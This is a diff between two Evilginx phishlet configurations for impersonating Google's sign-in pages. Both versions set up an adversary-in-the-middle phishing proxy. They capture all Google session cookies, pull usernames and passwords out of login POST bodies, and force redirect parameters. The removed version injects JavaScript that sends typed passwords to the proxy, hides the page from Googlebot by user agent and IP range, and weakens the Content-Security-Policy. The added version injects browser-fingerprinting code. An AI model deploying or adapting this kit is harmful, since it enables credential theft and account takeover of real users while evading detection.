@@ -1,149 +1,97 @@
-author: '@Evi1Grey5'
-min_ver: '3.0.0'
+author: '@tomer'
+min_ver: '2.3.0'
 
+# Subdomains that Evilginx will proxy
 proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
-  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true  , is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
 
+# Match replace rules, mostly to detect unwanted redirections to legitimate site and replacing the redirect urls with our Evilginx url
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script></head>', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy', replace: "default-src * 'unsafe-inline' 'unsafe-eval';", mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'application/xml']}
 
+# What cookies to steal from responses, i.e, the final prize.
+# we just capture ALL using [".*,regexp"]
 auth_tokens:
   - domain: '.google.com'
-    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+    keys: [".*,regexp"]
   - domain: 'accounts.google.com'
-    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
+  - domain: 'mail.google.com'
+    keys: [".*,regexp"]
 
-auth_urls:
-  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
-  - '/CheckCookie'
-  - '/ManageAccount'
-  - '/'
-
+# Regexes to capture username/password pairs
 credentials:
   username:
-    key: 'unenc_email'
-    search: '(.*)'
+    key: 'f.req'
+    search: '\[\]\]\,\"([^"]*)\"\,'
     type: 'post'
   password:
-    key: 'unenc_pwd'
-    search: '(.*)'
+    key: 'f.req'
+    search: ',\["([^"]*)",'
     type: 'post'
 
-force_post:
-  - path: '/selectchallenge'
-    search:
-      - {key: 'flowEntry', search: '.*'}
-      - {key: 'flowName', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
-    type: 'post'
+# If user reached these endpoints, capturing is finalized (hopefully with a success)
+auth_urls:
+  - '/CheckCookie'
+  - '/_/AccountSettingsUi/browserinfo'
 
-  - path: '/signin'
-    search:
-      - {key: 'flowEntry', search: '.*'}
-      - {key: 'flowName', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
-    type: 'post'
-
-  - path: '/speedbump'
-    search:
-      - {key: 'flowEntry', search: '.*'}
-      - {key: 'flowName', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
-    type: 'post'
-
-  - path: '/challenge'
-    search:
-      - {key: 'flowEntry', search: '.*'}
-      - {key: 'flowName', search: '.*'}
-    force:
-      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
-    type: 'post'
-
+# Legitimate site login page location
 login:
   domain: 'accounts.google.com'
   path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
 
+# Search POST requests with specific parameters and force additional ones
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search:
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+
+# JavaScript to be injected to proxied pages, for example, to bypass client side protection attempts
 js_inject:
-  - trigger_domains: ["accounts.google.com"]
-    trigger_paths: ["/identifier", "/"]
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
     script: |
-
-      // Cloak phishing form from known bots
-      if (navigator.userAgent.indexOf("Googlebot") === -1) {
-          // Only render phishing form for non-bots
-          async function postEndpoint(details) {
-              console.log('details poster', details);
-              var email = details['email'];
-              var pass = details['pass'];
-              var detailString = 'unenc_email=' + email + '&unenc_pwd=' + pass;
-              console.log('detailString', detailString)
-              try {
-                  await fetch(window.origin + `/v3/signin/_/AccountsSignInUi/data/batchexecute`, {
-                      method: 'POST',
-                      headers: {
-                        'content-type': 'application/x-www-form-urlencoded'
-                      },
-                      body: detailString
-                  })
-              } catch (err) {
-                  console.log(err)
-                  return false;
-              }
-              return;
+      function serialize( obj ){
+        var str = [];
+        for (var p in obj){
+          if (obj.hasOwnProperty(p)) {
+            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
           }
-
-          // Detect password changes
-          var passwordElem = document.querySelector('input[type="password"]');
-          passwordElem.addEventListener('input', function() {
-              var email = document.querySelector('[name="identifier"]').value;
-              var pass = this.value;
-              if (email && pass) {
-                  postEndpoint({email, pass});
-              }
-          });
+        }
+        return str.join("&");
       }
-
-      // IP-based bot filtering for Google ranges
-      setTimeout(() => {
-        const blacklistIPRanges = [
-          "66.249.64.0/19",  // Google IP range
-        ];
-        fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => {
-            const userIP = data.ip;
-            blacklistIPRanges.forEach(range => {
-              if (isIPInRange(userIP, range)) {
-                // Block user or redirect if IP is in range
-                window.location.href = 'https://google.com';
-              }
-            });
-          });
-      }, 1000);
-
-      function isIPInRange(ip, range) {
-        const [rangeStart, bits] = range.split('/');
-        const ipAsInt = ipToInt(ip);
-        const rangeStartAsInt = ipToInt(rangeStart);
-        const mask = ~(2 ** (32 - bits) - 1);
-        return (ipAsInt & mask) === (rangeStartAsInt & mask);
+      function toPopulate(){
+        console.log( "Populating" );
+        var xhttp = new XMLHttpRequest();
+        var tosend = {
+          useragent : navigator.userAgent,
+          browser    : navigator.appName,
+          engine     : navigator.product,
+          platform   : navigator.platform,
+        }
+        xhttp.onreadystatechange = function(){
+          console.log( "Sent" );
+        }
+        xhttp.open( "POST", "/getuserinfo", true );
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        console.log( serialize( tosend ) );
+        xhttp.send( serialize( tosend ) );
       }
-
-      function ipToInt(ip) {
-        return ip.split('.').reduce((int, octet) => (int << 8) + parseInt(octet), 0);
-      }
-
-# Blacklist certain user agents
-user_agent_filter:
-  block: 
-    - "Googlebot"
-    - "Googlebot/2.1"
-    - "Google"
+      console.log( "Reached here." );
+      setTimeout(toPopulate, 2000);
